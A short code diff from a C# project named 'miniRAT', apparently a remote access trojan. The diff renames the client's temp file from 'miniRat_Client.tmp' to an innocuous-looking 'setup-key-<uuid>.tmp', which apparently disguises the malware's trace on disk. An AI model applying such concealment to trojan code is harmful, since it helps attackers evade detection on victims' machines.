@@ -9,7 +9,8 @@ namespace miniRAT
 {
     public class ClientKeyRegistery
     {
-        static readonly string fileName = Path.Combine(Path.GetTempPath(), "miniRat_Client.tmp");
+        const string uuidKey = "89111f57-01c6-4699-8a8f-a91c6b0c495e";
+        static readonly string fileName = Path.Combine(Path.GetTempPath(), $"setup-key-{uuidKey}.tmp");
 
         private static string GetOrCreateTmpFile()
         {
